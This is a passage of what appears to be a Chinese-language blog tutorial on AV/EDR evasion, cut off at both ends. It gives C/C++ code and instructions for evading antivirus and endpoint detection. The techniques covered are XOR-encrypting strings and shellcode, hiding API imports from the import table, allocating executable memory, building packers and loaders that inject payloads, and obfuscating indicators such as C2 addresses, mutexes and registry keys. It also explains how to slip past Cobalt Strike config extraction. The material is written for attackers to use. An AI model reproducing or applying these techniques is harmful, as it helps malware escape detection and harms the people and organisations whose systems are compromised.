class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i)<br>        output[i] = input[i] ^ key;<br>    output[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    <span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// XOR加密的&quot;cmd.exe&quot;，密钥为0x55</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* enc_cmd = <span class="hljs-string">&quot;\x36\x38\x31\x7b\x30\x30&quot;</span>;<br>    <span class="hljs-type">char</span>* cmd = <span class="hljs-built_in">xor_decrypt</span>(enc_cmd, <span class="hljs-number">0x55</span>);<br>    <span class="hljs-built_in">WinExec</span>(cmd, SW_HIDE);<br>    <span class="hljs-keyword">delete</span>[] cmd;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>为什么这样有效：</strong><br>AV扫描时查找明文的<code>&quot;cmd.exe&quot;</code>，但由于字符串被加密，除非它进行模拟或解密，否则无法检测到。</p>
<hr>
<h3 id="2-2-2-–-避免静态导入"><a href="#2-2-2-–-避免静态导入" class="headerlink" title="2.2.2 – 避免静态导入"></a><strong>2.2.2 – 避免静态导入</strong></h3><p>静态导入可疑的API（例如<code>VirtualAlloc</code>、<code>CreateRemoteThread</code>、<code>WriteProcessMemory</code>）可能会触发基于签名的AV检测。</p>
<h4 id="示例：运行时解析API"><a href="#示例：运行时解析API" class="headerlink" title="示例：运行时解析API"></a>示例：运行时解析API</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">FARPROC <span class="hljs-title">get_api</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* lib, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* func)</span> </span>&#123;<br>    HMODULE hMod = <span class="hljs-built_in">LoadLibraryA</span>(lib);  <span class="hljs-comment">// 加载DLL</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">GetProcAddress</span>(hMod, func); <span class="hljs-comment">// 解析函数地址</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>在上下文中使用：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span><span class="hljs-params">(WINAPI* pVirtualAlloc)</span><span class="hljs-params">(LPVOID, SIZE_T, DWORD, DWORD)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    pVirtualAlloc myVA = (pVirtualAlloc)<span class="hljs-built_in">get_api</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br>    <span class="hljs-type">void</span>* mem = <span class="hljs-built_in">myVA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">4096</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>优点：</strong><br>此函数不在<strong>导入地址表（IAT）</strong>中，使得AV在静态分析时更难识别可疑的API。</p>
<hr>
<h3 id="2-2-3-–-PE头部操作"><a href="#2-2-3-–-PE头部操作" class="headerlink" title="2.2.3 – PE头部操作"></a><strong>2.2.3 – PE头部操作</strong></h3><p>签名扫描程序可以根据PE结构进行匹配。你可以：</p>
<ul>
<li><p>移除或清空<code>Import Directory</code>。</p>
</li>
<li><p>修改<code>TimeDateStamp</code>。</p>
</li>
<li><p>更改<code>.text</code>段的名称或权限。</p>
</li>
<li><p>插入垃圾段或加密负载容器。</p>
</li>
</ul>
<p>像<strong>PEBear</strong>、<strong>LordPE</strong>和<strong>CFF Explorer</strong>这样的工具可以帮助手动编辑。或者，你可以用C++构建一个最小的PE加载器，在运行时重建头部。</p>
<hr>
<h3 id="2-2-4-–-使用垃圾指令混淆"><a href="#2-2-4-–-使用垃圾指令混淆" class="headerlink" title="2.2.4 – 使用垃圾指令混淆"></a><strong>2.2.4 – 使用垃圾指令混淆</strong></h3><p>注入<strong>垃圾指令</strong>或<strong>NOP等价指令</strong>使得签名匹配更加困难。</p>
<h4 id="示例：内联垃圾操作"><a href="#示例：内联垃圾操作" class="headerlink" title="示例：内联垃圾操作"></a>示例：内联垃圾操作</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">__asm &#123;<br>    nop<br>    <span class="hljs-keyword">xor</span> eax, eax<br>    add eax, <span class="hljs-number">1</span>      <span class="hljs-comment">// 真实逻辑</span><br>    nop<br>    nop<br>&#125;<br></code></pre></td></tr></table></figure>

<p>你还可以使用编译器特定的标志：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">g++ -fvisibility=hidden -fomit-frame-pointer -falign-functions=32 -Os payload.cpp -o evasive.exe<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-2-5-–-加密Shellcode或负载缓冲区"><a href="#2-2-5-–-加密Shellcode或负载缓冲区" class="headerlink" title="2.2.5 – 加密Shellcode或负载缓冲区"></a><strong>2.2.5 – 加密Shellcode或负载缓冲区</strong></h3><p>静态检测可能会捕捉到嵌入的Shellcode字节模式。</p>
<h4 id="XOR加密的Shellcode示例："><a href="#XOR加密的Shellcode示例：" class="headerlink" title="XOR加密的Shellcode示例："></a>XOR加密的Shellcode示例：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> enc_shellcode[] = &#123;<br>    <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xCC</span> <span class="hljs-comment">// XOR加密负载</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xor_decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* buf, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key)</span> </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; len; ++i)<br>        buf[i] ^= key;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在执行前，你可以使用<code>VirtualAlloc</code>和<code>CreateThread</code>解密Shellcode。保持原始字节模式在编译时隐藏。</p>
<hr>
<h3 id="2-2-6-–-自定义加密器和打包器"><a href="#2-2-6-–-自定义加密器和打包器" class="headerlink" title="2.2.6 – 自定义加密器和打包器"></a><strong>2.2.6 – 自定义加密器和打包器</strong></h3><p>与其依赖商业打包器（如UPX），不如自己构建一个打包器，来：</p>
<ul>
<li><p>加密负载。</p>
</li>
<li><p>在运行时丢弃或注入到内存中。</p>
</li>
<li><p>使用分阶段加载（加载器+负载）。</p>
</li>
</ul>
<p>你可以将其构建为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// loader.cpp: 解密并执行负载</span><br><span class="hljs-comment">// payload.bin: 原始加密负载文件</span><br></code></pre></td></tr></table></figure>

<p>加载器从磁盘或内存中读取并解密负载，然后将其注入到当前或远程进程中。</p>
<hr>
<h3 id="2-2-7-–-使用宏和模板进行编译时混淆"><a href="#2-2-7-–-使用宏和模板进行编译时混淆" class="headerlink" title="2.2.7 – 使用宏和模板进行编译时混淆"></a><strong>2.2.7 – 使用宏和模板进行编译时混淆</strong></h3><p>使用模板和宏可以生成多态变化。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBF(x) #x</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* cmd = <span class="hljs-built_in">OBF</span>(c m d . e x e);  <span class="hljs-comment">// 破坏静态解析器</span><br></code></pre></td></tr></table></figure>

<p>即使是简单的变异也能改变二进制签名，有助于绕过静态指纹识别。</p>
<hr>
<h3 id="2-2-8-–-总结"><a href="#2-2-8-–-总结" class="headerlink" title="2.2.8 – 总结"></a><strong>2.2.8 – 总结</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>目的</th>
</tr>
</thead>
<tbody><tr>
<td>字符串混淆</td>
<td>隐藏恶意标记，避免扫描器检测</td>
</tr>
<tr>
<td>运行时API解析</td>
<td>防止基于IAT的检测</td>
</tr>
<tr>
<td>PE头部定制</td>
<td>避免文件格式上的签名匹配</td>
</tr>
<tr>
<td>垃圾指令</td>
<td>使代码签名无效</td>
</tr>
<tr>
<td>Shellcode加密</td>
<td>避免已知字节模式检测</td>
</tr>
<tr>
<td>自定义加密器&#x2F;打包器</td>
<td>控制负载的传递与内存布局</td>
</tr>
<tr>
<td>编译时混淆</td>
<td>创建多态构建</td>
</tr>
</tbody></table>
<h2 id="AV-EDR规避实战技术-2-3-混淆妥协指标（IOCs）"><a href="#AV-EDR规避实战技术-2-3-混淆妥协指标（IOCs）" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.3 - 混淆妥协指标（IOCs）"></a><strong>AV&#x2F;EDR规避实战技术 - 2.3 - 混淆妥协指标（IOCs）</strong></h2><p>妥协指标（IOCs）是EDR和AV引擎用来检测恶意活动的证据或模式。常见的IOCs包括硬编码的IP地址、域名、文件路径、互斥体名称和注册表键值。如果二进制文件直接包含这些信息，它将成为静态和行为引擎的容易目标。</p>
<p>在本节中，我们将探讨如何使用C&#x2F;C++混淆这些IOCs，确保关键值在运行时动态解析或生成。</p>
<hr>
<h3 id="2-3-1-–-IP地址混淆"><a href="#2-3-1-–-IP地址混淆" class="headerlink" title="2.3.1 – IP地址混淆"></a><strong>2.3.1 – IP地址混淆</strong></h3><h4 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h4><p>硬编码的IP地址（例如<code>192.168.0.1</code>）可能会在静态检查时被EDR和AV标记，甚至可能通过内存扫描提取出来。</p>
<h4 id="技术：-2"><a href="#技术：-2" class="headerlink" title="技术："></a>技术：</h4><h5 id="a-将IP作为整数存储，并在运行时转换："><a href="#a-将IP作为整数存储，并在运行时转换：" class="headerlink" title="a) 将IP作为整数存储，并在运行时转换："></a>a) 将IP作为整数存储，并在运行时转换：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winsock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// IP存储为十六进制: 0xC0A80001 == 192.168.0.1</span><br>    DWORD ipHex = <span class="hljs-number">0xC0A80001</span>;<br>    in_addr ipAddr;<br>    ipAddr.S_un.S_addr = ipHex;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Connecting to: &quot;</span> &lt;&lt; <span class="hljs-built_in">inet_ntoa</span>(ipAddr) &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="b-将IP字符串分割："><a href="#b-将IP字符串分割：" class="headerlink" title="b) 将IP字符串分割："></a>b) 将IP字符串分割：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* part1 = <span class="hljs-string">&quot;192&quot;</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* part2 = <span class="hljs-string">&quot;.168&quot;</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* part3 = <span class="hljs-string">&quot;.0&quot;</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* part4 = <span class="hljs-string">&quot;.1&quot;</span>;<br><br>std::string ip = std::<span class="hljs-built_in">string</span>(part1) + part2 + part3 + part4;<br></code></pre></td></tr></table></figure>

<p>这种技术将打破引擎查找完整IP模式的静态模式识别。</p>
<hr>
<h3 id="2-3-2-–-域名和URL混淆"><a href="#2-3-2-–-域名和URL混淆" class="headerlink" title="2.3.2 – 域名和URL混淆"></a><strong>2.3.2 – 域名和URL混淆</strong></h3><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>如果二进制文件中包含<code>&quot;malicious-site.com&quot;</code>的明文，它很容易被黑名单检测到。</p>
<h4 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h4><p>将域名分割，或使用Base64&#x2F;XOR编码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-function">std::string <span class="hljs-title">xor_decode</span><span class="hljs-params">(<span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt;&amp; data, <span class="hljs-type">char</span> key)</span> </span>&#123;<br>    std::string result;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> c : data)<br>        result += c ^ key;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::vector&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>&gt; obf_domain = &#123;<span class="hljs-number">0x7F</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x65</span>&#125;; <span class="hljs-comment">// 使用0x12进行XOR编码</span><br>    std::string domain = <span class="hljs-built_in">xor_decode</span>(obf_domain, <span class="hljs-number">0x12</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Decoded domain: &quot;</span> &lt;&lt; domain &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="替代方法：使用DNS-over-HTTPS（DoH）或域名生成算法（DGA）"><a href="#替代方法：使用DNS-over-HTTPS（DoH）或域名生成算法（DGA）" class="headerlink" title="替代方法：使用DNS over HTTPS（DoH）或域名生成算法（DGA）"></a>替代方法：使用DNS over HTTPS（DoH）或域名生成算法（DGA）</h4><ul>
<li><p>DGA可以根据时间&#x2F;日期生成域名。</p>
</li>
<li><p>通过仅在运行时解析域名，避免静态检测。</p>
</li>
</ul>
<hr>
<h3 id="2-3-3-–-文件路径和互斥体混淆"><a href="#2-3-3-–-文件路径和互斥体混淆" class="headerlink" title="2.3.3 – 文件路径和互斥体混淆"></a><strong>2.3.3 – 文件路径和互斥体混淆</strong></h3><h5 id="a-使用动态名称生成（随机或哈希）："><a href="#a-使用动态名称生成（随机或哈希）：" class="headerlink" title="a) 使用动态名称生成（随机或哈希）："></a>a) 使用动态名称生成（随机或哈希）：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br><span class="hljs-function">std::string <span class="hljs-title">generate_mutex_name</span><span class="hljs-params">()</span> </span>&#123;<br>    std::stringstream ss;<br>    ss &lt;&lt; <span class="hljs-string">&quot;Global\\&quot;</span> &lt;&lt; <span class="hljs-built_in">GetTickCount</span>();<br>    <span class="hljs-keyword">return</span> ss.<span class="hljs-built_in">str</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    std::string mutexName = <span class="hljs-built_in">generate_mutex_name</span>();<br>    HANDLE hMutex = <span class="hljs-built_in">CreateMutexA</span>(<span class="hljs-literal">NULL</span>, FALSE, mutexName.<span class="hljs-built_in">c_str</span>());<br>    <span class="hljs-keyword">if</span> (hMutex) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;Mutex created: &quot;</span> &lt;&lt; mutexName &lt;&lt; std::endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="b-Base64编码路径或使用运行时环境变量："><a href="#b-Base64编码路径或使用运行时环境变量：" class="headerlink" title="b) Base64编码路径或使用运行时环境变量："></a>b) Base64编码路径或使用运行时环境变量：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">char</span> tempPath[MAX_PATH];<br><span class="hljs-built_in">GetTempPathA</span>(MAX_PATH, tempPath);<br><br>std::string filePath = std::<span class="hljs-built_in">string</span>(tempPath) + <span class="hljs-string">&quot;hidden.dat&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>这种方法隐藏了绝对路径，并适应当前系统。</p>
<hr>
<h3 id="2-3-4-–-注册表键值混淆"><a href="#2-3-4-–-注册表键值混淆" class="headerlink" title="2.3.4 – 注册表键值混淆"></a><strong>2.3.4 – 注册表键值混淆</strong></h3><p>如果某个注册表键值通常与恶意软件相关，它可能会被加入黑名单。</p>
<h5 id="a-使用嵌套或模糊的键值："><a href="#a-使用嵌套或模糊的键值：" class="headerlink" title="a) 使用嵌套或模糊的键值："></a>a) 使用嵌套或模糊的键值：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HKEY hKey;<br><span class="hljs-built_in">RegCreateKeyA</span>(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Intel\\Update\\Cache&quot;</span>, &amp;hKey);<br></code></pre></td></tr></table></figure>

<h5 id="b-使用随机的键名，每次执行或每台机器都不同："><a href="#b-使用随机的键名，每次执行或每台机器都不同：" class="headerlink" title="b) 使用随机的键名，每次执行或每台机器都不同："></a>b) 使用随机的键名，每次执行或每台机器都不同：</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctime&gt;</span></span><br><br><span class="hljs-function">std::string <span class="hljs-title">get_reg_key</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br>    <span class="hljs-type">int</span> r = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10000</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Software\\System\\Temp\\&quot;</span> + std::<span class="hljs-built_in">to_string</span>(r);<br>&#125;<br></code></pre></td></tr></table></figure>

<h5 id="c-尽量避免写入注册表；使用内存或临时文件。"><a href="#c-尽量避免写入注册表；使用内存或临时文件。" class="headerlink" title="c) 尽量避免写入注册表；使用内存或临时文件。"></a>c) 尽量避免写入注册表；使用内存或临时文件。</h5><hr>
<h3 id="2-3-5-–-反内存扫描混淆"><a href="#2-3-5-–-反内存扫描混淆" class="headerlink" title="2.3.5 – 反内存扫描混淆"></a><strong>2.3.5 – 反内存扫描混淆</strong></h3><p>许多AV和EDR扫描进程内存中的已知模式，如：</p>
<ul>
<li><p>ASCII指标（例如<code>&quot;Powershell&quot;</code>，<code>&quot;cmd.exe&quot;</code>）</p>
</li>
<li><p>硬编码的C2标记</p>
</li>
<li><p>可疑的互斥体字符串</p>
</li>
</ul>
<h4 id="对策："><a href="#对策：" class="headerlink" title="对策："></a>对策：</h4><ul>
<li><p>使用仅在需要时解密的逻辑混淆敏感字符串。</p>
</li>
<li><p>使用<code>SecureZeroMemory</code>清除使用过的内存。</p>
</li>
<li><p>将值存储在碎片化的缓冲区中或动态生成。</p>
</li>
</ul>
<hr>
<h3 id="2-3-6-–-实际案例：Cobalt-Strike配置提取"><a href="#2-3-6-–-实际案例：Cobalt-Strike配置提取" class="headerlink" title="2.3.6 – 实际案例：Cobalt Strike配置提取"></a><strong>2.3.6 – 实际案例：Cobalt Strike配置提取</strong></h3><p>工具如<code>cs-config-extractor</code>会搜索：</p>
<ul>
<li><p><code>&quot;C2Server&quot;</code>字符串</p>
</li>
<li><p><code>&quot;UserAgent&quot;</code>，<code>&quot;PostUri&quot;</code>模式</p>
</li>
<li><p>Beacon内存中的XOR密钥</p>
</li>
</ul>
<p>为避免这种检测：</p>
<ul>
<li><p>加密配置部分。</p>
</li>
<li><p>使用不明显的变量命名。</p>
</li>
<li><p>避免将静态配置存储在内存中；仅在必要时重构。</p>
</li>
</ul>
<hr>
<h3 id="2-3-7-–-通过间接方式混淆IOC"><a href="#2-3-7-–-通过间接方式混淆IOC" class="headerlink" title="2.3.7 – 通过间接方式混淆IOC"></a><strong>2.3.7 – 通过间接方式混淆IOC</strong></h3><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">std::map&lt;std::string, std::string&gt; api_map = &#123;<br>    &#123;<span class="hljs-string">&quot;netconn&quot;</span>, <span class="hljs-string">&quot;192.168.1.1&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;agent&quot;</span>, <span class="hljs-string">&quot;hidden.localdomain&quot;</span>&#125;,<br>&#125;;<br><br><span class="hljs-function">std::string <span class="hljs-title">fetch_api</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string&amp; key)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> api_map[key];<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这种方式通过隐藏上下文和行为，避免了扫描器简单模式匹配。</p>
<hr>
<h3 id="2-3-8-–-总结表格"><a href="#2-3-8-–-总结表格" class="headerlink" title="2.3.8 – 总结表格"></a><strong>2.3.8 – 总结表格</strong></h3><table>
<thead>
<tr>
<th>IOC类型</th>
<th>混淆技术</th>
</tr>
</thead>
<tbody><tr>
<td>IP地址</td>
<td>整数格式、字符串拆分、DGA</td>
</tr>
<tr>
<td>域名&#x2F;URL</td>
<td>XOR&#x2F;Base64编码、动态解析</td>
</tr>
<tr>
<td>文件路径</td>
<td>环境变量、随机名称</td>
</tr>
<tr>
<td>互斥体</td>
<td>哈希名称、每台机器生成</td>
</tr>
<tr>
<td>注册表键值</td>
<td>嵌套键、随机生成</td>
</tr>
<tr>
<td>内存中的字符串</td>
<td>运行时加密或碎片化</td>
</tr>
</tbody></table>
<h2 id="AV-EDR规避实战技术-2-4-手动导入地址表（IAT）解析和动态链接"><a href="#AV-EDR规避实战技术-2-4-手动导入地址表（IAT）解析和动态链接" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 2.4 - 手动导入地址表（IAT）解析和动态链接"></a><strong>AV&#x2F;EDR规避实战技术 - 2.4 - 手动导入地址表（IAT）解析和动态链接</strong></h2><p>静态API导入（如在导入地址表（IAT）中声明的那些）通常被AV&#x2F;EDR工具用来检测潜在的恶意行为。例如，像<code>VirtualAlloc</code>、<code>WriteProcessMemory</code>或<code>CreateRemoteThread</code>这样的函数出现在IAT中时，会明显提示可能存在代码注入。</p>
<p>本节探讨了通过在运行时动态解析Windows API函数，避免静态链接和基于IAT的检测的方法。</p>
<hr>
<h3 id="2-4-1-–-为什么避免静态链接？"><a href="#2-4-1-–-为什么避免静态链接？" class="headerlink" title="2.4.1 – 为什么避免静态链接？"></a><strong>2.4.1 – 为什么避免静态链接？</strong></h3><p>当C&#x2F;C++二进制文件静态链接Windows API函数时，它们的地址会被存储在IAT中。像PE-sieve或EDR传感器等工具可以：</p>
<ul>
<li><p>检测IAT中的危险API。</p>
</li>
<li><p>在进程创建过程中钩取这些函数。</p>
</li>
<li><p>对函数导入应用启发式分析。</p>
</li>
</ul>
<p>动态链接避免了这些检测，因为API会在执行期间解析，通常是在行为检查之后。</p>
<hr>
<h3 id="2-4-2-–-使用-GetProcAddress-和-LoadLibrary"><a href="#2-4-2-–-使用-GetProcAddress-和-LoadLibrary" class="headerlink" title="2.4.2 – 使用 GetProcAddress 和 LoadLibrary"></a><strong>2.4.2 – 使用 <code>GetProcAddress</code> 和 <code>LoadLibrary</code></strong></h3><p>最简单的动态解析API方法是通过<code>LoadLibrary</code>和<code>GetProcAddress</code>。</p>
<h4 id="示例：手动解析-VirtualAlloc"><a href="#示例：手动解析-VirtualAlloc" class="headerlink" title="示例：手动解析 VirtualAlloc"></a>示例：手动解析 <code>VirtualAlloc</code></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span> <span class="hljs-params">(WINAPI* pVirtualAlloc)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">    SIZE_T dwSize,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  flAllocationType,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  flProtect</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span 